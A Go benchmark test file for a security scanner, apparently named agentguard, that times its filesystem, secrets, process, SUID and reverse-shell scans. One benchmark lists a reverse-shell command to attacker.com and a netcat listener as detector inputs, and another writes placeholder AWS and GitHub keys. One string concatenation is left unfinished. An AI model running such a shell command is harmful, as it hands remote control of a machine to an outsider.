package scanner

import (
	"os"
	"path/filepath"
	"testing"
)

// BenchmarkScanFilesystem benchmarks filesystem scanning
func BenchmarkScanFilesystem(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanFilesystem()
	}
}

// BenchmarkScanShell benchmarks shell scanning
func BenchmarkScanShell(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanShell()
	}
}

// BenchmarkScanNetwork benchmarks network scanning
func BenchmarkScanNetwork(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanNetwork()
	}
}

// BenchmarkScanSecrets benchmarks secrets scanning
func BenchmarkScanSecrets(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanSecrets()
	}
}

// BenchmarkScanFileContents benchmarks file content scanning
func BenchmarkScanFileContents(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanFileContents()
	}
}

// BenchmarkScanDependencies benchmarks dependency scanning
func BenchmarkScanDependencies(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanDependencies()
	}
}

// BenchmarkScanProcesses benchmarks process scanning
func BenchmarkScanProcesses(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ScanProcesses()
	}
}

// BenchmarkRunAllScans benchmarks running all scans
func BenchmarkRunAllScans(b *testing.B) {
	for i := 0; i < b.N; i++ {
		RunAllScans()
	}
}

// BenchmarkKeyPatternMatching benchmarks the key pattern matching
func BenchmarkKeyPatternMatching(b *testing.B) {
	tmpDir, err := os.MkdirTemp("", "agentguard-bench-*")
	if err != nil {
		b.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	testFile := filepath.Join(tmpDir, "test.env")
	content := "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n" +
		"SECRET_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz1234\n" +
	if err := os.WriteFile(testFile, []byte(content), 0644); err != nil {
		b.Fatal(err)
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		scanFileForKeys(testFile)
	}
}

// BenchmarkReverseShellDetection benchmarks reverse shell pattern detection
func BenchmarkReverseShellDetection(b *testing.B) {
	testCommands := []string{
		"bash -i >& /dev/tcp/attacker.com/4444 0>&1",
		"nc -l -p 4444",
		"ls -la",
		"cat file.txt",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, cmd := range testCommands {
			isReverseShellPattern(cmd)
		}
	}
}

// BenchmarkScanSUIDFiles benchmarks SUID file scanning
func BenchmarkScanSUIDFiles(b *testing.B) {
	if testing.Short() {
		b.Skip("Skipping SUID benchmark in short mode")
	}
	for i := 0; i < b.N; i++ {
		ScanSUIDFiles()
	}
}

// BenchmarkScanSUIDFilesParallel benchmarks parallel SUID scanning
func BenchmarkScanSUIDFilesParallel(b *testing.B) {
	if testing.Short() {
		b.Skip("Skipping SUID benchmark in short mode")
	}
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			ScanSUIDFiles()
		}
	})
}
